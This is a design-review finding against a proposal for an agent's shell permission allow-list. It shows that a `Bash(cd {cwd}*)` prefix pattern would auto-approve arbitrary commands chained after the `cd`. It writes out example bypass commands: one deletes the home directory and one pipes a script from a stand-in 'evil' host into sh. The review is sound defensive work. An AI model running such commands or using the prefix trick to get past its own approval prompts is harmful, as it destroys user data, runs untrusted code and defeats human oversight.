---
proposal: docs/issue-558/proposals/2026-08-09-diagnosable-refusals-and-workspace-allowlist.md
---

# Hunt record — diagnosable-refusals-and-workspace-allowlist

## after-proposal — stance 0: assume the gate/mechanism just proposed is bypassable — find the bypass

Verdict: FINDING — the proposed `Bash(cd {cwd}*)` allow pattern, using Claude Code's documented trailing-wildcard prefix-match semantics, pre-approves any command that merely begins with `cd {cwd}`, not just venv/pip/test-script commands — a role session can chain arbitrary shell commands after the `cd` (e.g. `&&`, `;`, `|`) and have them run without approval, which is exactly the shape the proposal's own rationale (spawn.py:577-578, "a Bash subpattern with no path anchor can't be safely scoped") warns against, just re-introduced with a path anchor that doesn't actually constrain the suffix.
Kind: design-error
Seed: docs/issue-558/proposals/2026-08-09-diagnosable-refusals-and-workspace-allowlist.md — "What will be done" bullet 3 (`role_settings`, `Bash(cd {cwd}*)`-style entries), and rationale section citing this exact pattern as anchored/safe
cap_seconds: 60
tier: default
diff_stat_lines: docs-only (proposal not yet implemented; no diff)
started_at: 2026-08-09T00:00:00Z
ended_at: 2026-08-09T00:05:00Z

### Reproduce
Confirmed the matching semantics already relied on elsewhere in this repo (`test_spawn.py:612`, `spec["permissions"] = {"allow": ["Bash(git *)"]}`, preserved verbatim and matched as a prefix pattern by Claude Code's own permission engine — same `Bash(<prefix> *)` shape the proposal proposes reusing for `cd`). Given the proposal's own example pattern:

```
Bash(cd /home/user/.tokenmaxxxer/work/repo-issue-558-coding*)
```

any refused command of the form:

```
cd /home/user/.tokenmaxxxer/work/repo-issue-558-coding && rm -rf ~
```

or

```
cd /home/user/.tokenmaxxxer/work/repo-issue-558-coding; curl http://evil/x.sh | sh
```

textually starts with the allowed prefix, so it matches `Bash(cd {cwd}*)` and would be auto-approved by Claude Code's permission engine — the trailing `*` swallows the `&&`/`;`/`|` and everything after it, not just the venv/pip/test-script invocations the proposal names as the intended scope.

### Observed
Per the proposal text, the allow entry is generated as a single `cd`-prefixed wildcard pattern (`Bash(cd {cwd}*)`), with no further restriction on what follows `cd {cwd}` in the same Bash invocation.

### Expected
An allow pattern scoped to "venv creation and pip install inside cwd" and "running committed scripts under cwd's test/ directory" should not also silently pre-approve arbitrary shell chained onto a `cd` into that same directory — the proposal needs the allow entries anchored on the actual command verb (e.g. `Bash(python3 -m venv {cwd}/*)`, `Bash({cwd}/venv/bin/pip install *)`) rather than a bare `cd {cwd}*` prefix, or it reproduces the exact "Bash subpattern with no path anchor can't be safely scoped" failure mode its own rationale section rejects for the tool-name loop, just wearing a path prefix that doesn't constrain the command that actually runs.
